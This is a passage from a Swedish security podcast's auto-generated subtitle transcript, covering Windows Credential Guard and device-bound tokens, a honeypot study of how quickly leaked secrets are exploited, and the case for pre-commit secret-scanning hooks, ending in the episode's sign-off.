Någonting ute i den stora världen.



`701 00:24:23,600 --> 00:24:24,040`
Och



`702 00:24:24,040 --> 00:24:26,800`
vad som har hänt



`703 00:24:26,800 --> 00:24:28,480`
är att i



`704 00:24:28,480 --> 00:24:30,920`
Windows Server



`705 00:24:30,920 --> 00:24:32,480`
2025 och



`706 00:24:32,480 --> 00:24:34,860`
i någon variant



`707 00:24:34,860 --> 00:24:35,460`
av



`708 00:24:35,460 --> 00:24:38,680`
Windows 11 så



`709 00:24:38,680 --> 00:24:40,180`
har man börjat slå på



`710 00:24:40,180 --> 00:24:42,560`
dels credential guard



`711 00:24:42,560 --> 00:24:44,540`
men också någon option om



`712 00:24:44,540 --> 00:24:45,840`
att man vill ha



`713 00:24:45,840 --> 00:24:47,620`
vad heter det?



`714 00:24:48,260 --> 00:24:50,180`
Typ credential eller device



`715 00:24:50,440 --> 00:24:51,720`
vending eller någonting heter det.



`716 00:24:55,040 --> 00:24:56,560`
Vilket alltså innebär



`717 00:24:56,560 --> 00:24:58,160`
dels att du



`718 00:24:58,160 --> 00:24:59,420`
flyttar



`719 00:24:59,420 --> 00:25:02,320`
så att istället för att du lägger



`720 00:25:02,320 --> 00:25:04,280`
alla dina creds och sånt



`721 00:25:04,280 --> 00:25:06,420`
i en klassisk Windows-installation så ligger de



`722 00:25:06,420 --> 00:25:08,620`
ju i Windows-operativsystemet.



`723 00:25:09,680 --> 00:25:11,260`
Med credential guard



`724 00:25:11,260 --> 00:25:12,500`
så skickar du dem till



`725 00:25:12,500 --> 00:25:14,300`
en liten säker



`726 00:25:14,300 --> 00:25:16,540`
applet eller container eller vad man vill kalla det



`727 00:25:16,540 --> 00:25:18,680`
som ligger och kör bredvid



`728 00:25:18,680 --> 00:25:19,880`
Windows.



`729 00:25:20,440 --> 00:25:20,940`
Eller de här



`730 00:25:20,940 --> 00:25:23,360`
det heter VSM



`731 00:25:23,360 --> 00:25:26,200`
när man kör lite



`732 00:25:26,200 --> 00:25:28,220`
vad fan heter det?



`733 00:25:28,260 --> 00:25:29,860`
När den hypervisor som gör grejer.



`734 00:25:30,100 --> 00:25:32,340`
Alltså så den ligger utanför operativsystemet.



`735 00:25:32,360 --> 00:25:33,920`
Någon TPM eller något sånt där?



`736 00:25:34,260 --> 00:25:36,120`
Ja, typ mjuk TPM



`737 00:25:36,120 --> 00:25:38,940`
via hypervisorstuffs.



`738 00:25:39,300 --> 00:25:39,380`
Ja.



`739 00:25:41,080 --> 00:25:42,260`
Så det är den ena att



`740 00:25:42,260 --> 00:25:44,800`
det är inte så jättelätt



`741 00:25:44,800 --> 00:25:46,340`
att be Windows att tappa bort



`742 00:25:46,340 --> 00:25:48,520`
sina credentials som det har varit historiskt sett.



`743 00:25:48,520 --> 00:25:50,080`
Som att Windows helt enkelt inte,



`744 00:25:50,440 --> 00:25:50,860`
har de.



`745 00:25:52,140 --> 00:25:53,960`
Och det andra är att de har



`746 00:25:53,960 --> 00:25:57,040`
gjort någon liten ändring så att



`747 00:25:57,040 --> 00:26:00,940`
de här tokenen när de lämnar



`748 00:26:00,940 --> 00:26:02,780`
maskinen så är de mer bunna



`749 00:26:02,780 --> 00:26:04,420`
till maskinen än de har varit historiskt sett.



`750 00:26:04,520 --> 00:26:05,000`
Så att du kan,



`751 00:26:05,780 --> 00:26:08,620`
så att Jesper snor min token



`752 00:26:08,620 --> 00:26:09,800`
så har det ju alltid varit så att de,



`753 00:26:10,320 --> 00:26:12,600`
så fort jag har med min token så kan Jesper direkt



`754 00:26:12,600 --> 00:26:13,380`
använda den.



`755 00:26:14,260 --> 00:26:16,200`
Men nu så är min token



`756 00:26:16,200 --> 00:26:18,080`
mer bunden till min device.



`757 00:26:18,280 --> 00:26:20,420`
Så att om Jesper börjar använda den



`758 00:26:20,420 --> 00:26:21,900`
från sidan om så ska



`759 00:26:21,900 --> 00:26:24,340`
supporterande system



`760 00:26:24,340 --> 00:26:26,360`
upptäcka att nej, du har



`761 00:26:26,360 --> 00:26:28,300`
inte rätt att använda den här.



`762 00:26:29,720 --> 00:26:30,520`
Så det är en



`763 00:26:30,520 --> 00:26:32,520`
ny cool feature som finns



`764 00:26:32,520 --> 00:26:34,320`
med senare versioner



`765 00:26:34,320 --> 00:26:35,400`
av Windows som



`766 00:26:35,400 --> 00:26:38,320`
Hur gör de den devicebindningen?



`767 00:26:38,460 --> 00:26:38,640`
Vet du det?



`768 00:26:40,280 --> 00:26:41,500`
Antingen så måste det vara



`769 00:26:41,500 --> 00:26:44,160`
signerat med en privat nyckel som bara finns



`770 00:26:44,160 --> 00:26:45,740`
i den devicen eller så att



`771 00:26:45,740 --> 00:26:48,240`
en unik ID



`772 00:26:48,240 --> 00:26:50,060`
som är på något sätt kopplat till tokenet.



`773 00:26:50,420 --> 00:26:51,280`
Okej.



`774 00:26:51,940 --> 00:26:52,300`
Ja.



`775 00:26:53,800 --> 00:26:55,980`
Du känner att det var någon mer svår fråga



`776 00:26:55,980 --> 00:26:57,400`
men ja.



`777 00:26:58,840 --> 00:26:59,840`
Någon form



`778 00:26:59,840 --> 00:27:02,220`
av kryptografisk



`779 00:27:02,220 --> 00:27:04,200`
koppling måste ju byggas till



`780 00:27:04,200 --> 00:27:05,420`
din enhet.



`781 00:27:05,860 --> 00:27:06,200`
Så att



`782 00:27:06,200 --> 00:27:09,720`
det finns ju i



`783 00:27:09,720 --> 00:27:12,000`
nu kallar jag det verkligen inte



`784 00:27:12,000 --> 00:27:13,740`
Windows. Alltså det är väl



`785 00:27:13,740 --> 00:27:16,020`
någon variant på Carberos



`786 00:27:16,020 --> 00:27:16,520`
och så.



`787 00:27:17,700 --> 00:27:20,120`
Och jag kan verkligen inte det. Protokollet



`788 00:27:20,120 --> 00:27:21,340`
på superlåg nivå men



`789 00:27:21,340 --> 00:27:24,100`
det finns ju i andra



`790 00:27:24,100 --> 00:27:25,620`
system så finns det ju att du



`791 00:27:25,620 --> 00:27:28,400`
hårdkodar ett token



`792 00:27:28,400 --> 00:27:30,100`
alltså om du tänker dig JVT



`793 00:27:30,100 --> 00:27:32,060`
och sånt så finns det ju fält för att koda



`794 00:27:32,060 --> 00:27:34,120`
att JVT delas i



`795 00:27:34,120 --> 00:27:35,520`
bunden till en viss



`796 00:27:35,520 --> 00:27:38,580`
till en viss



`797 00:27:38,580 --> 00:27:40,260`
mottagare



`798 00:27:40,260 --> 00:27:42,020`
och du kan också binda att



`799 00:27:42,020 --> 00:27:43,900`
tokenet är



`800 00:27:43,900 --> 00:27:45,920`
hårt bundet till en viss klient



`801 00:27:45,920 --> 00:27:48,620`
och sen signaturen får det så att



`802 00:27:48,620 --> 00:27:50,020`
den är hårt kopplad.



`803 00:27:50,120 --> 00:27:52,040`
Och sen inte kan användas på något annat sätt



`804 00:27:52,040 --> 00:27:54,100`
och du bygger upp det med TLS och grejer



`805 00:27:54,100 --> 00:27:55,980`
och sånt. Och då



`806 00:27:55,980 --> 00:27:57,680`
antar jag att den här



`807 00:27:57,680 --> 00:27:59,840`
devicebundningen på Windows



`808 00:27:59,840 --> 00:28:01,960`
gör något snarlik men på



`809 00:28:01,960 --> 00:28:03,640`
mycket lägre nivå på Carberos då.



`810 00:28:04,660 --> 00:28:04,880`
Och



`811 00:28:04,880 --> 00:28:08,060`
det är så bra att vi



`812 00:28:08,060 --> 00:28:10,000`
dels har en artikel och sen har vi



`813 00:28:10,000 --> 00:28:12,020`
en video från Microsoft där de pratar om



`814 00:28:12,020 --> 00:28:14,100`
hur bra det är. Och där kommer alla detaljer



`815 00:28:14,100 --> 00:28:16,380`
finnas? Inte alla detaljer



`816 00:28:16,380 --> 00:28:18,100`
för jag har inte någon som helst minne



`817 00:28:18,100 --> 00:28:18,700`
om att de har



`818 00:28:20,120 --> 00:28:21,780`
möjlighet att i detaljerna



`819 00:28:21,780 --> 00:28:23,700`
i sansartikeln att det förklaras bättre



`820 00:28:23,700 --> 00:28:25,800`
men jag kan säga att den Microsoft-dragningen



`821 00:28:25,800 --> 00:28:27,480`
som jag lyssnade på så gick de



`822 00:28:27,480 --> 00:28:29,440`
verkligen inte ner på den detaljgraden som du



`823 00:28:29,440 --> 00:28:30,040`
efterfrågade.



`824 00:28:31,140 --> 00:28:33,720`
Men vi antar att det är hyfsat välgjort.



`825 00:28:34,820 --> 00:28:35,880`
Tills motsatsen



`826 00:28:35,880 --> 00:28:37,900`
bevisas. Ja precis, om det inte är välgjort



`827 00:28:37,900 --> 00:28:39,480`
så får du kära lyssnare



`828 00:28:39,480 --> 00:28:41,340`
jättegärna göra en säkerhetsanalys



`829 00:28:41,340 --> 00:28:42,920`
totalt knäcka det här och sen



`830 00:28:42,920 --> 00:28:45,380`
kan du be oss vara med på en skop



`831 00:28:45,380 --> 00:28:47,320`
om hur CVN på



`832 00:28:47,320 --> 00:28:48,700`
och hur trasigt det här är



`833 00:28:48,700 --> 00:28:51,100`
så kan vi vara nästan



`834 00:28:51,100 --> 00:28:53,320`
först utmärlade när du släpper den nyheten.



`835 00:28:53,480 --> 00:28:53,880`
Rimligt.



`836 00:28:56,500 --> 00:28:57,220`
Coolt.



`837 00:28:57,280 --> 00:28:59,580`
Credential leaks då.



`838 00:28:59,940 --> 00:29:00,140`
Ja.



`839 00:29:00,960 --> 00:29:03,180`
Jag hittade en artikel



`840 00:29:03,180 --> 00:29:04,180`
om att



`841 00:29:04,180 --> 00:29:07,020`
det tesen, jag kortade ner



`842 00:29:07,020 --> 00:29:09,600`
tesen till att Secret Rotation



`843 00:29:09,600 --> 00:29:10,300`
suger.



`844 00:29:12,380 --> 00:29:13,100`
De



`845 00:29:13,100 --> 00:29:15,040`
förde



`846 00:29:15,040 --> 00:29:16,340`
tesen att



`847 00:29:16,340 --> 00:29:17,980`
vi har



`848 00:29:18,700 --> 00:29:20,680`
förlitas oss på att det är okej



`849 00:29:20,680 --> 00:29:22,560`
att vi är så kassabanterade hemligheter



`850 00:29:22,560 --> 00:29:25,040`
för att vi kan rotera dem



`851 00:29:25,040 --> 00:29:26,420`
när allting har gått åt skogen.



`852 00:29:29,160 --> 00:29:29,400`
Och



`853 00:29:29,400 --> 00:29:32,440`
då förde de tesen att



`854 00:29:32,440 --> 00:29:35,140`
normalt sett, tiden för dig



`855 00:29:35,140 --> 00:29:36,660`
från det att du tappar bort



`856 00:29:36,660 --> 00:29:37,960`
din secret



`857 00:29:37,960 --> 00:29:40,960`
till det att secreten är



`858 00:29:40,960 --> 00:29:43,380`
roterad, det brukar vara



`859 00:29:43,380 --> 00:29:44,560`
relativt långt.



`860 00:29:45,420 --> 00:29:47,100`
Så då körde de en honeypot-övning



`861 00:29:47,100 --> 00:29:47,940`
istället att de



`862 00:29:48,700 --> 00:29:51,540`
satte upp lite olika



`863 00:29:51,540 --> 00:29:53,340`
secrets av lite olika typer



`864 00:29:53,340 --> 00:29:55,760`
kopplade till olika grejer



`865 00:29:55,760 --> 00:29:57,500`
och sen började de helt enkelt mäta



`866 00:29:57,500 --> 00:29:59,760`
på de känslorna när kommer första inloggningen



`867 00:29:59,760 --> 00:30:01,980`
och sen började de läcka



`868 00:30:01,980 --> 00:30:03,740`
då relaterade hemligheter



`869 00:30:03,740 --> 00:30:04,600`
i olika kanaler



`870 00:30:04,600 --> 00:30:07,240`
och den



`871 00:30:07,240 --> 00:30:08,440`
snabbaste



`872 00:30:08,440 --> 00:30:10,980`
hackningen då, eller



`873 00:30:10,980 --> 00:30:13,280`
om man nu vill kalla det hackningen, den första



`874 00:30:13,280 --> 00:30:14,880`
exploiteringen



`875 00:30:14,880 --> 00:30:17,500`
av att du har tappat bort dina hemligheter



`876 00:30:17,500 --> 00:30:18,620`
den inträffade alltså



`877 00:30:18,620 --> 00:30:20,620`
minuter efter att du har gjort bort dig



`878 00:30:20,620 --> 00:30:23,280`
vilket typ är snabbare



`879 00:30:23,280 --> 00:30:24,960`
än vad det tar för utvecklare att märka



`880 00:30:24,960 --> 00:30:26,000`
att de har gjort bort sig



`881 00:30:26,000 --> 00:30:28,280`
filen ger dem



`882 00:30:28,280 --> 00:30:31,660`
alltså inloggningarna till S3-backen



`883 00:30:31,660 --> 00:30:33,040`
så inloggningarna till



`884 00:30:33,040 --> 00:30:34,520`
typ någon gittum



`885 00:30:34,520 --> 00:30:37,060`
de klassiska ställen



`886 00:30:37,060 --> 00:30:38,140`
där du brukar läcka dem typ



`887 00:30:38,140 --> 00:30:40,380`
de råkade, eller ja, råkade



`888 00:30:40,380 --> 00:30:43,000`
men de typ råkade pusha dig till något gitter



`889 00:30:43,000 --> 00:30:43,600`
på lite annat



`890 00:30:43,600 --> 00:30:45,580`
så



`891 00:30:45,580 --> 00:30:48,540`
tydligen, åtminstone om du är



`892 00:30:48,620 --> 00:30:50,640`
målad något sorts intresse



`893 00:30:50,640 --> 00:30:52,960`
då ligger det folk som är



`894 00:30:52,960 --> 00:30:54,940`
duktiga där, och i och med att det



`895 00:30:54,940 --> 00:30:56,500`
handlade om minuter



`896 00:30:56,500 --> 00:30:58,720`
så måste det ju nästan vara



`897 00:30:58,720 --> 00:30:59,860`
bortstött, liksom



`898 00:30:59,860 --> 00:31:03,120`
så det



`899 00:31:03,120 --> 00:31:05,040`
det sitter ju team där ute



`900 00:31:05,040 --> 00:31:06,960`
som tydligen är jävligt skärpta



`901 00:31:06,960 --> 00:31:07,540`
på att slå...



`902 00:31:07,540 --> 00:31:09,600`
Vad var det för hemlighetstyper, vet du det?



`903 00:31:12,940 --> 00:31:13,660`
Vilket typ?



`904 00:31:13,660 --> 00:31:14,480`
Typ S3-backet



`905 00:31:14,480 --> 00:31:15,020`
så lite annat



`906 00:31:15,020 --> 00:31:17,020`
Ja, det var access keys



`907 00:31:17,020 --> 00:31:17,600`
typ, eller?



`908 00:31:18,620 --> 00:31:19,680`
Ja, alltså det är blandat



`909 00:31:19,680 --> 00:31:21,620`
nu har jag inte upp



`910 00:31:21,620 --> 00:31:23,600`
jag har inte upp artikeln, jag kan inte upp den



`911 00:31:23,600 --> 00:31:24,140`
men alltså



`912 00:31:24,140 --> 00:31:28,220`
tesen var ju, de testade ju olika flöden



`913 00:31:28,220 --> 00:31:30,420`
och fick mätvärden



`914 00:31:30,420 --> 00:31:31,580`
på hur snabbt det gick



`915 00:31:31,580 --> 00:31:33,880`
och så för olika, så att de har ju



`916 00:31:33,880 --> 00:31:34,720`
grafer och sånt, men



`917 00:31:34,720 --> 00:31:36,300`
själva huvudtesen är



`918 00:31:36,300 --> 00:31:39,620`
det går rätt jävla snabbt från det



`919 00:31:39,620 --> 00:31:42,140`
att du har fuckat upp och råkat publicera



`920 00:31:42,140 --> 00:31:43,180`
dina credentials



`921 00:31:43,180 --> 00:31:45,240`
till det att någon är där och knackar



`922 00:31:45,240 --> 00:31:47,300`
så att



`923 00:31:47,300 --> 00:31:48,580`
så det var ju väldigt



`924 00:31:48,620 --> 00:31:50,600`
spännande, så om man tänker då att man är så duktig



`925 00:31:50,600 --> 00:31:52,740`
så att man liksom, oj oj oj, vi fuckade upp



`926 00:31:52,740 --> 00:31:54,440`
och sen en vecka senare har man



`927 00:31:54,440 --> 00:31:56,600`
märkt det här, man har filat sin



`928 00:31:56,600 --> 00:31:58,440`
bug och man har till och med genomfört det



`929 00:31:58,440 --> 00:32:00,440`
då har liksom



`930 00:32:00,440 --> 00:32:02,420`
internet hunnit hacka dig ett par



`931 00:32:02,420 --> 00:32:04,600`
tusen gånger om. Lösningen är ju



`932 00:32:04,600 --> 00:32:05,900`
bara att inte göra fel från början



`933 00:32:05,900 --> 00:32:07,940`
och du bara slutar göra fel



`934 00:32:07,940 --> 00:32:09,960`
men det



`935 00:32:09,960 --> 00:32:12,460`
det diskuterades i



`936 00:32:12,460 --> 00:32:13,640`
bland annat någon



`937 00:32:13,640 --> 00:32:16,480`
utvecklarkanal där han hatade på



`938 00:32:16,480 --> 00:32:17,500`
alla sådana här



`939 00:32:18,620 --> 00:32:20,240`
pre-commits-hooks



`940 00:32:20,240 --> 00:32:21,800`
och hävdade att man ska skjuta folk som



`941 00:32:21,800 --> 00:32:23,780`
rekommenderar pre-commits



`942 00:32:23,780 --> 00:32:26,340`
där tog han just upp att



`943 00:32:26,340 --> 00:32:28,560`
ja, det enda valida



`944 00:32:28,560 --> 00:32:29,660`
use-caset



`945 00:32:29,660 --> 00:32:32,400`
han gick inte helt med den här



`946 00:32:32,400 --> 00:32:34,440`
utvecklingen på att det är ett validt use-case, men han hävdade att



`947 00:32:35,080 --> 00:32:36,620`
det är liksom ändå så här



`948 00:32:36,620 --> 00:32:38,280`
det är inte motiverat att döda



`949 00:32:38,280 --> 00:32:39,900`
den personen som föreslår det



`950 00:32:39,900 --> 00:32:41,880`
det är just för



`951 00:32:41,880 --> 00:32:43,420`
för



`952 00:32:43,420 --> 00:32:45,760`
secret scanning



`953 00:32:45,760 --> 00:32:47,300`
att det är



`954 00:32:47,300 --> 00:32:48,460`
det är



`955 00:32:48,620 --> 00:32:51,260`
där han ändå kan förstå use-caset



`956 00:32:51,260 --> 00:32:51,780`
för att



`957 00:32:51,780 --> 00:32:54,540`
nästan allt annat



`958 00:32:54,540 --> 00:32:56,980`
så är det rimligt att se kedysystemet



`959 00:32:56,980 --> 00:32:58,060`
upptäcka att du har fuckat upp



`960 00:32:58,060 --> 00:33:00,760`
och sen säga till dig, men just för



`961 00:33:00,760 --> 00:33:02,500`
secrets-leaks så kan



`962 00:33:02,500 --> 00:33:05,340`
till och med hardcore-utvecklare



`963 00:33:05,340 --> 00:33:06,820`
kan förstå hur



`964 00:33:06,820 --> 00:33:08,760`
du tänker när du tycker att det



`965 00:33:08,760 --> 00:33:10,400`
borde ligga i en pre-commits-hook



`966 00:33:10,400 --> 00:33:12,760`
annars inte att de hatar folk som



`967 00:33:12,760 --> 00:33:13,880`
rekommenderar pre-commits-hook



`968 00:33:13,880 --> 00:33:16,840`
att du sabbar ju all form



`969 00:33:16,840 --> 00:33:17,900`
av produktivitet



`970 00:33:18,620 --> 00:33:20,760`
plus att du förlitar dig på att lokala



`971 00:33:20,760 --> 00:33:22,620`
utvecklar miljöer, kollar saker



`972 00:33:22,620 --> 00:33:24,720`
som säkerhetssystem borde kolla



`973 00:33:24,720 --> 00:33:27,860`
men pre-commits-hook



`974 00:33:27,860 --> 00:33:29,380`
för secretscanning



`975 00:33:29,380 --> 00:33:32,620`
vid säkerhetsnördar är väldigt



`976 00:33:32,620 --> 00:33:34,080`
positiva och



`977 00:33:34,080 --> 00:33:36,900`
det är i varje fall någonting man borde överväga



`978 00:33:36,900 --> 00:33:37,720`
just för att



`979 00:33:37,720 --> 00:33:40,620`
det är ju ganska final när du har



`980 00:33:40,620 --> 00:33:43,020`
publicerat dina hemligheter



`981 00:33:43,020 --> 00:33:44,540`
så är du i ett jobbigt läge



`982 00:33:44,540 --> 00:33:48,500`
pre-commits-hook så kan du



`983 00:33:48,620 --> 00:33:50,440`
få veta att du har gjort bort dig



`984 00:33:50,440 --> 00:33:52,820`
innan du har kommittat



`985 00:33:52,820 --> 00:33:53,660`
och innan du har pushat



`986 00:33:53,660 --> 00:33:55,420`
ännu bättre



`987 00:33:55,420 --> 00:33:58,760`
innan alla hemlisarna sitter på githubben



`988 00:33:58,760 --> 00:34:01,520`
så det rekommenderar vi



`989 00:34:01,520 --> 00:34:02,820`
trots att folk hatar det



`990 00:34:02,820 --> 00:34:05,100`
men så är det med mycket



`991 00:34:05,100 --> 00:34:07,280`
inom säkerhet tycker jag



`992 00:34:07,280 --> 00:34:07,940`
nog väl



`993 00:34:07,940 --> 00:34:10,560`
där så har vi knutit upp säcken för



`994 00:34:10,560 --> 00:34:12,460`
det här avsnittet av säkerhetspodcasten



`995 00:34:12,460 --> 00:34:14,300`
jag som pratade hette Johan Ryberg Möller



`996 00:34:14,300 --> 00:34:15,780`
med mig hade jag Rickard Botfors



`997 00:34:15,780 --> 00:34:17,260`
att vi har tid i dag



`998 00:34:17,260 --> 00:34:18,460`
och med er



`999 00:34:18,460 --> 00:34:18,480`
hej\!



`1000 00:34:18,620 --> 00:34:21,020`
posten är ditt postkvantum



`1001 00:34:21,020 --> 00:34:22,120`
har vi det?



`1002 00:34:22,620 --> 00:34:23,380`
hej\!



`1003 00:34:27,580 --> 00:34:30,320`
kan det vara så att polisen har räddpillat dem?



`1004 00:34:30,580 --> 00:34:31,020`
de har



`1005 00:34:31,020 --> 00:34:32,860`
de har pillat dem lite



`1006 00:34:32,860 --> 00:34:34,680`
det här och det där tror jag



`1007 00:34:34,680 --> 00:34:36,620`
jag hörde något annat



`1008 00:34:37,200 --> 00:34:42,620`
det eskalated quickly



`1009 00:34:43,200 --> 00:34:46,680`
det var dumt



`1010 00:34:48,620 --> 00:34:54,620`
okej



`1011 00:34:54,620 --> 00:34:56,620`
åh varenda



`1012 00:34:56,620 --> 00:34:58,620`
ska du prata såhär?



`1013 00:34:58,620 --> 00:35:00,620`
varenda i The Matrix



`1014 00:35:00,620 --> 00:35:02,620`
hehehe



`1015 00:35:02,620 --> 00:35:04,620`
hehehe



`1016 00:35:04,620 --> 00:35:06,620`
hehehe



`1017 00:35:06,620 --> 00:35:08,620`
hehehe



`1018 00:35:08,620 --> 00:35:10,620`
hehehe



`1019 00:35:10,620 --> 00:35:12,620`
hehehe



`1020 00:35:12,620 --> 00:35:14,620`
hehehe



`1021 00:35:14,620 --> 00:35:16,620`
hehehe



`1022 00:35:16,620 --> 00:35:17,120`
hehehe


